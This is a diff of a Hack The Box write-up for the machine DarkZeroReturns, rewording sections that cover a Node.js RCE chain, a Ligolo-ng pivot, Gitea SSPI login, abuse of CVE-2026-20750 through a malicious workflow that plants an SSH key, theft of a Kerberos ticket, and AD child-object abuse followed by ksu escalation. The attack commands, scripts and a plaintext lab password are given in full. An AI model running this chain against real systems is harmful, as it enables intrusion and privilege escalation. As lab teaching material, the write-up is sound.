@@ -167,9 +167,9 @@ The character endpoint accepts `campaign_message` as a JSON object and feeds it 
 With node-level control, the payload walks the JavaScript prototype chain from an innocuous value to the `Function` constructor, then invokes Node's module system:
 
 ```text
-"s" → String.prototype.split → Array → Array.prototype.pop → function object
-   → .constructor → Function("return process.mainModule.require('child_process')")
-   → .execSync(...)   →   arbitrary OS commands as `darkzero`
+"s" -> String.prototype.split -> Array -> Array.prototype.pop -> function object
+    -> .constructor -> Function("return process.mainModule.require('child_process')")
+    -> .execSync(...) -> arbitrary OS commands as darkzero
 ```
 
 Now with all that set, there are still certain things we need to do in order to achieve RCE.
@@ -459,15 +459,14 @@ mysql: [Warning] Using a password on the command line interface can be insecure.
 +----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
 ```
 
-> 💡 **Credential Discovery & Password Recovery:**  
-> We recovered credentials for users `admin` and `josh`. Although these are bcrypt hashes, cracking them won't be straightforward, even though their cost factor appears standard.  
-> Due to high cracking computation times on local hardware, a peer from IRC with a high-performance cracking rig assisted in recovering the plaintext password for `josh`:
->
-> **Plaintext Credential:** `josh` : `Rangers1`
+> 💡 **FYI / Community Teamwork:**  
+> Bingo! We got creds for user `admin` and `josh`, although these are bcrypt hashes so cracking them won't be easy, even though their cost factor seems to be weak.  
+> Unfortunately I was unable to crack the hash initially as it was taking too much time, might be due to my CPU's and GPU's processing capabilities. So due to this I had to ask one of my friends from the IRC to provide me the password for `josh` if he cracked it, and he gave me the password—he has a good PC! :)  
+> **Credential:** `josh : Rangers1`
 
 ### SSH Access as Josh
 
-Now that we have the plaintext password, we can log in via SSH:
+Now that we have password we can try getting in via SSH:
 
 ```bash
 ssh josh@dzcampaigns.htb 
@@ -482,7 +481,7 @@ uid=780601110(josh) gid=780600513(domain users) groups=780600513(domain users),7
 
 ### Internal Pivoting via Ligolo-ng Tunneling
 
-While enumerating `josh`, I identified potential next steps regarding an internal Gitea service running on the system:
+So while enumerating `josh` I found out certain things on what could be the next move, which was Gitea—somewhere Gitea is running, might be internally:
 
 ```bash
 josh@SRV01:/tmp$ ps auxf | grep gitea
@@ -490,51 +489,52 @@ svc-run+    1408  0.0  1.1 1280288 21508 ?       Ssl  21:19   0:01 /opt/gitea-ru
 josh        1934  0.0  0.1   6544  2284 pts/1    S+   22:06   0:00              \_ grep --color=auto gitea
 ```
 
-A dedicated user named `svc-runner` is running the Gitea CI/CD runner process, and access to `/opt/gitea-runner` was restricted for `josh`. To interact with internal web services and the domain controller, we set up a tunnel using Ligolo-ng:
+A user named `svc-runner` is running all the Gitea processes, hence the access to its directory in `/opt` was denied for `josh`. To see Gitea we need to tunnel this up via Ligolo-ng.
 
-1. **Start the proxy server on your attack machine:**
-   ```bash
-   sudo ./proxy -selfcert
-   ```
+Start the proxy server on your machine with:
+```bash
+sudo ./proxy -selfcert
+```
 
-2. **Transfer the agent to the target machine, grant execution permissions, and establish the reverse connection:**
-   ```bash
-   josh@SRV01:/tmp$ ./agent -connect 10.10.15.54:11601 -ignore-cert
-   WARN[0000] warning, certificate validation disabled     
-   INFO[0000] Connection established                        addr="10.10.15.54:11601"
-   ```
+Then send the agent to target machine, change the mode to executable, and start the connection:
+```bash
+josh@SRV01:/tmp$ ./agent -connect 10.10.15.54:11601 -ignore-cert
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="10.10.15.54:11601"
+```
 
-3. **In the Ligolo-ng console, select the session and start the tunnel:**
-   ```text
-   ligolo-ng » INFO[0148] Agent joined.                                 id=00155df47c02 name=josh@SRV01 remote="10.129.97.25:61184"
-   ligolo-ng » session
-   ? Specify a session : 1 - josh@SRV01 - 10.129.97.25:61184 - 00155df47c02
-   [Agent : josh@SRV01] » start
-   INFO[0163] Starting tunnel to josh@SRV01 (00155df47c02) 
-   ```
+Then get back to your Ligolo terminal and start the tunneling:
+```text
+ligolo-ng » INFO[0148] Agent joined.                                 id=00155df47c02 name=josh@SRV01 remote="10.129.97.25:61184"
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - josh@SRV01 - 10.129.97.25:61184 - 00155df47c02
+[Agent : josh@SRV01] » start
+INFO[0163] Starting tunnel to josh@SRV01 (00155df47c02) 
+```
 
-4. **Configure the tun interface and local routing table:**
-   ```bash
-   sudo ip tuntap add user kali mode tun ligolo
-   sudo ip link set ligolo up
-   sudo ip route add 172.16.20.0/24 dev ligolo
-   ```
+Once done, create interfaces and routes for the target in your machine with:
+```bash
+sudo ip tuntap add user kali mode tun ligolo   # (change 'kali' to your username if needed, or 'root')
+sudo ip link set ligolo up
+sudo ip route add 172.16.20.0/24 dev ligolo
+```
 
-5. **Verify routing connectivity to the internal domain controller:**
-   ```bash
-   ping -c 2 172.16.20.2 
-   PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
-   64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=318 ms
-   64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=481 ms
+Then test it:
+```bash
+ping -c 2 172.16.20.2 
+PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=318 ms
+64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=481 ms
 
-   --- 172.16.20.2 ping statistics ---
-   2 packets transmitted, 2 received, 0% packet loss, time 1001ms
-   rtt min/avg/max/mdev = 318.377/399.451/480.526/81.074 ms
-   ```
+--- 172.16.20.2 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 318.377/399.451/480.526/81.074 ms
+```
 
 ### Internal Network Mapping & DC02 Reconnaissance
 
-With routing established, let's map the internal domain controller (`172.16.20.2`):
+We are in! Now let's map the internal network and see what ports and services are there with a quick NMAP scan:
 
 ```bash
 nmap -p- -sV -sC --min-rate 5000 -v -Pn 172.16.20.2  
@@ -564,7 +564,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
-As suspected, Active Directory is hosted internally. We have the domain name `dc02.darkzero.ext` with LDAP, Kerberos, and SMB ports open. Let's add this domain name and the Gitea subdomain into `/etc/hosts`:
+Good! As I said earlier the AD might be internal, and here it is: we have domain name `dc02.darkzero.ext` with all the necessary LDAP and AD ports. Let's add this domain name and Gitea subdomain as well into the hosts file:
 
 ```text
 172.16.20.2  dc02.darkzero.ext gitea.darkzero.ext
@@ -576,24 +576,23 @@ As suspected, Active Directory is hosted internally. We have the domain name `dc
 
 ### Kerberos SPNEGO Authentication & Gitea SSPI Login
 
-Attempting to log into the Gitea web interface using `josh`'s database credentials fails; however, Gitea has SSPI authentication enabled.
+Unfortunately `josh`'s creds aren't working for Gitea login, but luckily it has SSPI login enabled.
 
 > 📌 **What is SSPI Login?**  
-> SSPI (Security Support Provider Interface) is the Windows API used to negotiate secure authentication (such as Kerberos or NTLM) without transmitting plaintext credentials across the network. On Linux systems, the equivalent standard is GSSAPI (Generic Security Services Application Program Interface).  
-> When an enterprise application like Gitea is integrated into Active Directory, it supports "Windows Authentication" or "SSPI Login".
+> SSPI (Security Support Provider Interface) is the Windows API used to negotiate secure authentication (like Kerberos or NTLM) without sending plaintext passwords over the network. On Linux, the equivalent is GSSAPI (Generic Security Services Application Program Interface).  
+> When a web application like Gitea is joined to an Active Directory domain, it can be configured to allow "Windows Authentication" or "SSPI Login".
 
-#### Authentication Workflow Under the Hood:
+#### How it works under the hood:
+1. **User Authentication:** The domain user (`josh`) authenticates to the domain-joined Linux machine (`SRV01`) and receives a Kerberos Ticket Granting Ticket (TGT).
+2. **Negotiate Challenge:** When visiting `http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1`, the server asks for "Negotiate" authentication.
+3. **Service Ticket Acquisition:** The client automatically asks the Domain Controller for a Service Ticket specifically for the Gitea service (`HTTP/gitea.darkzero.ext`).
+4. **Ticket Presentation:** The client sends this Service Ticket to Gitea in the HTTP `Authorization: Negotiate` header.
+5. **Session Establishment:** Gitea validates the ticket with the Domain Controller and issues a web session cookie (`i_like_gitea`).
 
-1. **User Authentication:** The domain user (`josh`) authenticates to the domain-joined Linux system (`SRV01`) and receives a Kerberos Ticket Granting Ticket (TGT).
-2. **Negotiate Challenge:** When accessing `http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1`, the web server responds with a `WWW-Authenticate: Negotiate` challenge.
-3. **Service Ticket Acquisition:** The client requests a Service Ticket for the Gitea service principal (`HTTP/gitea.darkzero.ext`) from the Domain Controller.
-4. **Ticket Presentation:** The client transmits the ticket within the `Authorization: Negotiate <ticket>` header.
-5. **Session Establishment:** Gitea validates the ticket against the KDC, authenticates the user, and issues a web session cookie (`i_like_gitea`).
+> 🎯 **Why we use it here:**  
+> We don't necessarily know `josh`'s Gitea web UI password, or password login might be disabled for the web interface. However, because `josh` already has a valid Kerberos ticket on the OS level, we can use `curl` to perform this SSPI handshake and capture the resulting web session cookie, then paste it into the browser to browse Gitea as `josh`.
 
-> 🎯 **Why We Use SSPI Authentication Here:**  
-> We do not possess `josh`'s direct web UI password, or standard password logins may be administratively disabled. However, because `josh` possesses a valid Kerberos session at the OS level, we can leverage `curl` with SPNEGO negotiation to perform the handshake, extract the session cookie, and import it into our browser.
-
-Let's begin by requesting a fresh Kerberos ticket as `josh`:
+Let's start by requesting a Kerberos ticket as `josh`:
 
 ```bash
 josh@SRV01:~$ export KRB5CCNAME=/tmp/josh.ccache
@@ -602,7 +601,7 @@ Password for josh@DARKZERO.EXT:
 Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
 ```
 
-Now let's perform the SPNEGO negotiation using `curl`:
+Now let's perform the SPNEGO negotiation:
 
 ```bash
 josh@SRV01:~$ curl -v --negotiate -u : "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" 2>&1 | grep "Set-Cookie: i_like_gitea"
@@ -611,55 +610,54 @@ josh@SRV01:~$ curl -v --negotiate -u : "http://gitea.darkzero.ext:3000/user/logi
 ```
 
 #### Command Flag Breakdown:
-- `-v` — Enables verbose output so we can inspect HTTP response headers and handshake steps.
-- `--negotiate` — Instructs `curl` to use SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) to negotiate Kerberos authentication using the active TGT.
-- `-u :` — Required syntax flag for `curl` when using Negotiate authentication, specifying that credentials originate from the Kerberos credential cache.
-- `2>&1 | grep ...` — Redirects standard error to standard output to capture headers, filtering specifically for Gitea's session cookie (`Set-Cookie: i_like_gitea`).
+- `-v` — Enables verbose output so we can inspect the HTTP response headers.
+- `--negotiate` — Instructs `curl` to use SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) to automatically use the Kerberos TGT to request a Service Ticket for Gitea and present it in the `Authorization: Negotiate` header.
+- `-u :` — A required syntax flag for `curl` when using Negotiate authentication, even though no basic auth username/password is being sent.
+- `2>&1 | grep ...` — Redirects stderr to stdout to capture headers, filtering specifically for Gitea's session cookie (`i_like_gitea`).
 
-Copy the second `i_like_gitea` cookie into the browser and refresh the page:
+Then use the second cookie and paste it in the browser and refresh the page:
 
 ![web-img](images/DarkZeroReturns/d18.png)
 
-We are now authenticated as `darkzero_ext_josh`!
+You should be in as user `darkzero_ext_josh`!
 
 ### Vulnerability Analysis: Gitea CI/CD Context Confusion (CVE-2026-20750)
 
-Inspecting the Gitea version banner indicates version `1.25.0`, which is affected by a critical access control and context confusion vulnerability:
+One more thing: while looking at the version of Gitea, which is 1.25.0, there turns out to be a known vulnerability: CVE-2026-20750.
 
-> ⚠️ **CVE-2026-20750 — Gitea CI/CD Context Confusion (Pwn Request Variant)**  
-> Gitea contains an improper access control and workflow context evaluation vulnerability. When processing certain pull request events, Gitea fails to enforce proper boundary isolation between the head branch (fork) and the base branch (upstream repository), enabling unauthorized workflow execution.
+> ⚠️ **CVE-2026-20750 — Gitea CI/CD Context Confusion (The "Pwn Request" Variant)**  
+> Gitea contains an improper access control and workflow context evaluation vulnerability. When processing pull request review comments via the API, Gitea reads the workflow file from the attacker's forked head branch, but assigns execution permissions based on the trusted base repository—bypassing administrator approval.
 
-#### Normal CI/CD Execution vs. The Context Confusion Flaw
+#### 1. The Normal Flow (The Safety Net)
+To understand the bug, we first must understand how CI/CD systems are supposed to protect themselves:
+- **The Main Repo:** Contains the codebase and a CI/CD runner executing as `svc-runner`.
+- **The Attacker (Josh):** Lacks push permissions to the main branch.
+- **The Fork:** Josh forks the repository, makes modifications to his copy, and submits a Pull Request (PR).
+- **The Safety Net:** When seeing a PR from an outside fork, the CI/CD engine sandboxes execution and requires manual maintainer approval before executing the code.
 
-1. **The Normal Flow (The Safety Net):**
-   - **The Upstream Repository (Main Repo):** Contains the codebase and a CI/CD runner executing as `svc-runner`.
-   - **The Attacker (Josh):** Lacks push access to the main branch.
-   - **The Fork:** Josh forks the repository, adds custom workflow files, and submits a Pull Request.
-   - **The Safety Mechanism:** Gitea recognizes that the pull request originates from an untrusted fork and halts automatic execution until an organization maintainer explicitly reviews and approves the workflow.
-
-2. **The Flaw (The "Bait and Switch" Context Confusion):**
-   The vulnerability exists in how Gitea 1.25 handles event triggers—specifically the `pull_request_review_comment` event. When a review comment is posted via the API:
-   - Gitea retrieves the workflow definition from the **Head Branch** (the attacker's malicious fork).
-   - Gitea assigns execution permissions based on the **Base Branch** (the trusted main repository).
-   - **The Result:** The system treats the event as trusted internal discussion on the main repository, immediately dispatching the workflow to the runner without requiring administrative approval.
+#### 2. The Flaw (The "Bait and Switch" Context Confusion)
+The vulnerability exists in how Gitea 1.25 handles event triggers—specifically the `pull_request_review_comment` event. When a comment is posted via the API:
+- Gitea reads the workflow file from the **Head Branch** (the attacker's malicious fork).
+- But it assigns execution permissions based on the **Base Branch** (the trusted main repository).
+- **The Result:** The system sees a comment event originating from the main repository's PR discussion, assumes it's trusted internal communication, and triggers the runner (`svc-runner`) without administrator approval.
 
 We can inspect the existing workflow configuration by checking `.gitea/workflows/main.yaml`:
 
 ![web-img](images/DarkZeroReturns/d19.png)
 
-> 💡 **Execution Context Impact:**  
-> Standard `pull_request` triggers from forks are sandboxed, but `pull_request_target` and `pull_request_review_comment` triggers become dangerous if they check out untrusted pull request code.  
-> Furthermore, because `act_runner` on this host is configured with label `ubuntu:host` (executing directly on the host filesystem rather than inside an isolated Docker container), workflow execution translates directly to host command execution as `svc-runner`.
+> 💡 **Cool Fact — CI/CD Workflow Triggers:**  
+> Standard `pull_request` triggers from forks are sandboxed, but `pull_request_target` or `pull_request_review_comment` triggers are known to be dangerous if they check out the PR's code.  
+> Because the `act_runner` on this machine is configured to execute jobs locally on the host filesystem (`ubuntu:host`) rather than inside an isolated Docker container, code execution inside the workflow translates directly to Remote Code Execution on the host as `svc-runner`.
 
 #### The Attack Strategy:
 1. Fork the target repository (`DarkZero/DarkZero-Campaigns`).
-2. Inject a malicious workflow triggered by `pull_request_review_comment`.
-3. Open a Pull Request from our fork to the upstream `main` branch.
-4. Post a review comment via the API to trigger the workflow execution.
+2. Inject a workflow triggered by `pull_request_review_comment`.
+3. Open a Pull Request from our fork to upstream `main`.
+4. Use the API to post a review comment, triggering the logic bug.
 
-### CI/CD Exploitation: Phase 1 — Gearing Up (Kerberos Auth & SSH Keys)
+### CI/CD Exploitation: Phase 1 — Gearing Up (Auth + Keys)
 
-Every API call authenticates via Kerberos SPNEGO. We ensure our TGT is active and generate an SSH keypair to use as our persistence mechanism:
+Every API call we make will authenticate using Kerberos (SPNEGO). We need a fresh TGT, and we generate an SSH keypair where the public key is our payload and the private key is our shell key:
 
 ```bash
 josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
@@ -675,19 +673,19 @@ Valid starting       Expires              Service principal
         renew until 09/03/2026 21:28:05
 ```
 
-Generate an SSH keypair:
+Generate a fresh SSH keypair:
 
 ```bash
 ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
 export PUBKEY=$(cat ./htb_key2.pub)
 ```
 
-### CI/CD Exploitation: Phase 2 — Repository Fork & Timestamped Branching
+### CI/CD Exploitation: Phase 2 — The Setup (Fork + Unique Branch)
 
 We fork the base repository into `josh`'s namespace and create a unique timestamped branch to prevent conflicts:
 
 ```bash
-josh@SRV01:~$ # 1. Fork base repo into josh's namespace
+josh@SRV01:~$ # 1. FORK the base repo into josh's namespace
 curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' \
   "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" | jq '.full_name'
 
@@ -695,7 +693,7 @@ curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' \
 ```
 
 ```bash
-josh@SRV01:~$ # 2. Create a unique branch on our fork
+josh@SRV01:~$ # 2. Create a UNIQUE branch on our fork
 export BRANCH="pwn-$(date +%s)"
 echo "[*] Branch name: $BRANCH"
 
@@ -707,9 +705,9 @@ curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
 "pwn-1787866364"
 ```
 
-### CI/CD Exploitation: Phase 3 — Payload Delivery (Malicious Workflow Injection)
+### CI/CD Exploitation: Phase 3 — The Payload (Malicious Workflow)
 
-We define a workflow listening on `pull_request_review_comment` that writes our SSH public key to `/home/svc-runner/.ssh/authorized_keys`:
+We craft our malicious workflow listening for `pull_request_review_comment`:
 
 ```bash
 cat > /tmp/pwn.yml << EOF
@@ -730,7 +728,7 @@ jobs:
 EOF
 ```
 
-Encode the file in Base64 and upload it via the Gitea Contents API:
+Base64-encode and upload to `.gitea/workflows/pwn.yml` on our branch:
 
 ```bash
 export CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)
@@ -742,9 +740,9 @@ curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
 ".gitea/workflows/pwn.yml"
 ```
 
-### CI/CD Exploitation: Phase 4 — Bug Trigger via PR Review Comment
+### CI/CD Exploitation: Phase 4 — The Trigger (PR + Review Comment Bug)
 
-We submit a Pull Request from our branch to upstream `main`:
+Open the pull request from our fork to `main`:
 
 ```bash
 PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
@@ -758,7 +756,7 @@ echo "[+] PR #$PR_NUM created | Head SHA: $HEAD_SHA"
 [+] PR #1 created | Head SHA: e927ad2c9257b6a66059f790e75c92e1cf8222af
 ```
 
-Now, fire the bug by posting a review comment against the PR:
+Post a review comment to trigger the workflow execution:
 
 ```bash
 curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
@@ -770,7 +768,7 @@ curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
 
 ### CI/CD Exploitation: Phase 5 — Shell Access as svc-runner
 
-With the runner triggered, it executes our workflow payload and appends our key to `authorized_keys`. We can now log in via SSH:
+Wait for the runner to execute, then SSH in as `svc-runner` and boom:
 
 ```bash
 josh@SRV01:~$ ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
@@ -780,11 +778,11 @@ svc-runner@SRV01:~$ id
 uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
 ```
 
-We now have code execution as `svc-runner` on `SRV01` and can claim the user flag!
+Go get the user flag... we've been craving for it!
 
-### Master Exploit Automation Script (Josh to svc-runner)
+### Master Exploit Automation Script (Josh to Svc-Runner)
 
-For convenience, the complete lateral movement sequence can be executed with this automated bash script:
+For ease of work, this is the bash script that can be used to pivot from `josh` to `svc-runner`, if you're lazy like me :)
 
 ```bash
 #!/bin/bash
@@ -899,7 +897,7 @@ ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
 
 ### Host & Gitea Runner Configuration Audit
 
-Now in the context of `svc-runner`, we can inspect the Gitea runner directory which was previously restricted:
+As for privilege escalation, we are standing right next to the domain `dc02`, and we are ready to perform Active Directory enumeration. While there was nothing interesting found on the shell except this Gitea directory which was inaccessible from `josh`'s shell:
 
 ```bash
 svc-runner@SRV01:/tmp$ ls -la /opt/gitea*
@@ -927,7 +925,7 @@ cache:
 
 ### Active Directory Enumeration via Kerberos Ticket Cache
 
-Examining `/tmp` reveals a pre-existing Kerberos ticket cache belonging to `svc-runner`:
+The temp folder already has a Kerberos ticket saved:
 
 ```bash
 svc-runner@SRV01:/tmp$ ls
@@ -957,30 +955,18 @@ Valid starting       Expires              Service principal
         renew until 09/03/2026 20:05:05
 ```
 
-This is a valid Ticket Granting Ticket (TGT).
+This is a valid ticket!
 
 ### Clock Skew Synchronization & Local Ticket Export
 
-To export the cached Kerberos ticket to our local attack machine for Active Directory enumeration:
+We need to get this ticket in our machine to perform the AD enumeration:
 
-1. **Encode the credential cache to Base64 on target:**
-   ```bash
-   base64 -w0 /tmp/krb5cc_gitea
-   ```
-2. **Decode and restore the ticket cache locally:**
-   ```bash
-   echo '<PASTE_B64>' | base64 -d > svc-runner.ccache
-   ```
-3. **Restrict ticket file permissions:**
-   ```bash
-   chmod 600 svc-runner.ccache
-   ```
-4. **Set the Kerberos cache environment variable:**
-   ```bash
-   export KRB5CCNAME=$(pwd)/svc-runner.ccache
-   ```
+1. `base64 -w0 /tmp/krb5cc_gitea` — Convert ticket into Base64 format on the target.
+2. `echo '<PASTE_B64>' | base64 -d > svc-runner.ccache` — Decode and restore the ticket cache locally on our attack machine.
+3. `chmod 600 svc-runner.ccache` — Grant restrictive file permissions.
+4. `export KRB5CCNAME=$(pwd)/svc-runner.ccache` — Set the Kerberos cache environment variable.
 
-Verify the ticket cache on the local attack machine:
+Verify the ticket cache on our local machine:
 
 ```bash
 # klist
@@ -992,7 +978,7 @@ Valid starting       Expires              Service principal
         renew until 09/03/2026 20:05:05
 ```
 
-Let's begin by querying all domain users:
+Perfect, we got the ticket! Now let's start AD enumeration by listing all domain users:
 
 ```bash
 impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
@@ -1002,8 +988,8 @@ Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its a
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-> ⚠️ **Kerberos Clock Skew Synchronization:**  
-> Kerberos authentication strictly enforces time synchronization between client and KDC (default tolerance: 5 minutes). Standard `ntpdate` was blocked, so we synchronize local system time directly via SSH:
+> ⚠️ **Kerberos Time Sync:**  
+> Ahh the boss! Kerberos time sync error, the goat. The usual way with `ntpdate` doesn't work for some reason, so we can fetch the time with our SSH shell and set it as our date:
 
 ```bash
 sudo date -s "$(sshpass -p 'Rangers1' ssh -o StrictHostKeyChecking=no josh@dzcampaigns.htb date)"
@@ -1011,9 +997,7 @@ Warning: Permanently added '10.129.97.182' (ED25519) to the list of known hosts.
 Thu Aug 27 10:15:26 PM UTC 2026
 ```
 
-### Active Directory Domain User & SPN Enumeration
-
-With the clock synchronized, query domain users again:
+Now try again:
 
 ```bash
 impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
@@ -1035,7 +1019,7 @@ svc-gitea                                             2026-05-20 22:50:00.501204
 svc-runner                                            2026-05-20 22:50:01.066715  2026-08-27 20:05:05.647826 
 ```
 
-Now let's check for Kerberoastable Service Principal Names (SPNs):
+Now let's look for any Kerberoastable accounts (SPNs):
 
 ```bash
 impacket-GetUserSPNs -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner
@@ -1048,11 +1032,11 @@ HTTP/gitea.darkzero.ext:3000  svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,
 HTTP/gitea.darkzero.ext       svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185             
 ```
 
-No roastable user SPNs are present.
+None :(
 
 ### LDAP Organizational Unit & ACL Enumeration
 
-Let's enumerate Active Directory Organizational Units using `ldapsearch`:
+Let's list all organizational units via `ldapsearch`:
 
 ```text
 ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext -b "DC=darkzero,DC=ext" \
@@ -1091,7 +1075,7 @@ search: 4
 result: 0 Success
 ```
 
-Now let's check if `svc-runner` has write permissions over any of these OUs using `bloodyAD`:
+Perfect, now let's see if this user has any writeables over any of these OUs:
 
 ```bash
 bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext get writable
@@ -1109,9 +1093,7 @@ distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=d
 permission: CREATE_CHILD
 ```
 
-We have `CREATE_CHILD` permissions on `OU=GiteaMigration,DC=darkzero,DC=ext` and `DC=_msdcs.darkzero.ext`.
-
-Attempting BloodHound collection via Kerberos resulted in an LDAP signing dispute:
+Ahhaa! We have `CREATE_CHILD` on `OU=GiteaMigration` and `DC=_msdcs.darkzero.ext`. Good, this will work! But before getting our hands dirty on the OU, let's take a quick look at BloodHound as well:
 
 ```text
 bloodhound-python -d darkzero.ext -u svc-runner -k -no-pass \
@@ -1120,11 +1102,11 @@ bloodhound-python -d darkzero.ext -u svc-runner -k -no-pass \
 ldap3.core.exceptions.LDAPUnknownAuthenticationMethodError: NTLM needs domain\username and a password 
 ```
 
-Rather than submitting to the friction of this protocol dispute, we will pivot directly to the confirmed objective: exploiting the child object creation rights on the `GiteaMigration` OU.
+Unfortunately, the BloodHound tool is causing an error. Rather than submitting to the friction of this protocol dispute, we will pivot directly to the confirmed objective: exploiting the child object creation rights on the `GiteaMigration` OU. :)
 
 ### Active Directory DACL Abuse (Child Object Creation in OU=GiteaMigration)
 
-As we can create child objects inside `GiteaMigration`, we will use `bloodyAD` to create a new Active Directory user named `root` inside that OU:
+As we know that we can create a child object inside `GiteaMigration`, we will use `bloodyAD` to create an AD object in that OU:
 
 ```bash
 bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext --dc-ip 172.16.20.2 \
@@ -1133,7 +1115,7 @@ bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext --dc-ip 172.1
 [+] root created
 ```
 
-To verify the user was successfully created, query the domain users with Impacket:
+To ensure the user was actually created, query with Impacket:
 
 ```bash
 impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
@@ -1156,54 +1138,49 @@ svc-runner                                            2026-05-20 22:50:01.066715
 root                                                  2026-08-29 22:12:32.026066  <never>
 ```
 
-User `root@DARKZERO.EXT` is confirmed!
+Perfect! User is created.
 
 ### Kerberos Substitute User Escalation (ksu root)
 
-Now to elevate to root on this host, we leverage Kerberos Substitute User (`ksu`) authentication and authorization.
+Now to become root of this shell, we need to do the `ksu` authentication and authorization.
 
 > 📌 **What is ksu?**  
-> The `ksu` (Kerberos Substitute User) utility is a secure, Kerberized counterpart of the traditional Linux `su` program. Its purpose is to securely transition a user's real and effective UID to a target identity (such as `root`) by relying on Kerberos tickets instead of local password hashes.
+> The `ksu` (Kerberos Substitute User) command is a secure, Kerberized version of the traditional Linux `su` program. Its purpose is to securely change a user’s real and effective user ID to a target user (like `root`) by relying on Kerberos tickets instead of local password hashes.
 
 The `ksu` workflow operates in two main phases: Authentication and Authorization:
 
 ```text
-┌────────────────┐                ┌─────────────────────────┐
-│   Linux User   │─(1. kinit/TGT)─>   Active Directory (KDC)│
-└───────┬────────┘                └────────────┬────────────┘
-        │                                      │
- (2. ksu root)                                 │
-        │                                      │
-        ├──(3. Request host/ Service Ticket)──>│
-        │<──(4. Issue Service Ticket)──────────┘
-        │
- (5. Check .k5login / .k5users)
-        │
-┌───────▼────────┐
-│ Granted Root!  │
-└────────────────┘
++-----------------------+                    +------------------------+
+|  Linux User (SRV01)   |                    | Active Directory (KDC) |
++-----------+-----------+                    +-----------+------------+
+            |                                            |
+            | -------- (1) kinit root@DARKZERO.EXT ----> |
+            |                                            |
+            | <------- (2) Issue TGT for root ---------- |
+            |                                            |
+            | === [ (2) Execute: ksu root ]              |
+            |                                            |
+            | -------- (3) Request host/ Ticket -------> |
+            |                                            |
+            | <------- (4) Issue host/ Ticket ---------- |
+            |                                            |
+            | === [ (5) Evaluate .k5login / .k5users ]   |
+            |                                            |
++-----------v-----------+                                |
+|  Root Shell Granted!  |                                |
++-----------------------+                                |
 ```
 
 #### ksu Execution Lifecycle:
+1. **Requesting the Ticket Granting Ticket (TGT) via `kinit`:** The local Linux user logs in or switches to the newly created Active Directory object using the `kinit` utility.
+2. **Executing the Identity Switch (`ksu root`):** With a valid domain identity loaded into the session cache, the user initiates the privilege escalation request.
+3. **Service Ticket Request:** Before changing user contexts, `ksu` must cryptographically verify that the TGT held by the user is valid and current.
+4. **Issuance of the Service Ticket:** The KDC processes the request against the active TGT session.
+5. **Local Authorization Evaluation (`.k5login` / `.k5users`):** Now that identity is proven, `ksu` evaluates local security policies to determine if this domain user has permission to become the local system root.
 
-1. **Requesting the Ticket Granting Ticket (TGT) via `kinit`:**  
-   The local Linux user authenticates as the newly created Active Directory object using the `kinit` utility.
+> 💡 **Privilege Escalation Execution:** Because both authentication (Steps 1–4) and local authorization (Step 5) checks succeed, `ksu` changes the effective User ID (UID) of the process to 0 and spawns an interactive root shell.
 
-2. **Executing the Identity Switch (`ksu root`):**  
-   With a valid domain identity loaded into the session cache, the user initiates the privilege escalation request.
-
-3. **Service Ticket Request:**  
-   Before changing user contexts, `ksu` must cryptographically verify that the TGT held by the user is valid and current.
-
-4. **Issuance of the Service Ticket:**  
-   The KDC processes the request against the active TGT session and returns a service ticket for the host service.
-
-5. **Local Authorization Evaluation (`.k5login` / `.k5users`):**  
-   Now that identity is proven, `ksu` evaluates local security policies to determine if this domain user has permission to become the local system root.
-
-> 💡 **Privilege Escalation Execution:** Because both authentication (Steps 1–4) and local authorization (Step 5) checks succeed, `ksu` changes the effective User ID (UID) of the process to `0` and spawns an interactive root shell.
-
-Now let's start by requesting a TGT for `root`:
